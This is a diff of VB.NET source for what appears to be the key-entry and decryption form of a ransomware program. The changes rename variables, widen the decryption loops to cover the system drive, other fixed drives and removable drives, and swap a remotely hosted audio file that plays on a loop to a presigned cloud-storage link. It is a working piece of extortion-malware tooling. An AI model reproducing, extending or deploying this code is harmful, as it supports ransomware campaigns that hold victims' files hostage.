@@ -7,12 +7,13 @@ Imports WMPLib
 
 Public Class Form1
 
-    Public P1 As String
+    Public Pass As String
     Private Finished As Integer = 0
     Private FileCount As Integer = 0
     Private userName As String = Environment.UserName
-    Private LocalDisk = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
     Private OK As Boolean = False
+    Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
+
 
     Private Sub btnDecrypt_Click(sender As Object, e As EventArgs) Handles btnDecrypt.Click
         Try
@@ -20,7 +21,7 @@ Public Class Form1
                 MsgBox("You Need a KEY", MsgBoxStyle.Critical)
             Else
                 txtFiles.Text = String.Empty
-                P1 = txtKey.Text
+                Pass = txtKey.Text
                 btnDecrypt.Text = "Please Wait..."
                 btnDecrypt.Enabled = False
                 txtKey.ReadOnly = True
@@ -63,7 +64,7 @@ Public Class Form1
             End If
 
             Finished = 0
-            P1 = String.Empty
+            Pass = String.Empty
 
             btnDecrypt.Enabled = True
             btnDecrypt.Text = "Decrypt"
@@ -149,7 +150,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         On Error Resume Next
-        Dir_Dec(LocalDisk & "Users\" & userName & "\", P1)
+        Dir_Dec(C_DIR, Pass)
         Finished += 1
     End Sub
 
@@ -158,9 +159,9 @@ Public Class Form1
         On Error Resume Next
         For Each drive In Environment.GetLogicalDrives
             Dim Driver As DriveInfo = New DriveInfo(drive)
-            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(LocalDisk) Then
+            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                 Dim DriverPath As String = drive
-                Dir_Dec(DriverPath, P1)
+                Dir_Dec(DriverPath, Pass)
             End If
         Next
         Finished += 1
@@ -168,9 +169,13 @@ Public Class Form1
 
     Private Sub BackgroundWorker3_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker3.DoWork
         On Error Resume Next
-        If C_ID.Privileges = True Then
-            Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
-        End If
+        For Each drive In Environment.GetLogicalDrives
+            Dim Driver As DriveInfo = New DriveInfo(drive)
+            If Not Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                Dim DriverPath As String = drive
+                Dir_Dec(DriverPath, Pass)
+            End If
+        Next
         Finished += 1
     End Sub
 
@@ -178,7 +183,7 @@ Public Class Form1
     Private Sub BackgroundWorker4_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker4.DoWork
         Try
             Player.settings.setMode("Loop", True)
-            Player.URL = "https://instaud.io/_/2vrB.mp3"
+            Player.URL = "https://content-na.drive.amazonaws.com/v2/download/presigned/5ujSnRHmaF6f3B0VjagP_7lcSdDX-5Z051xMafyGRMUeJxFPc?download=true"
         Catch ex As Exception
         End Try
     End Sub
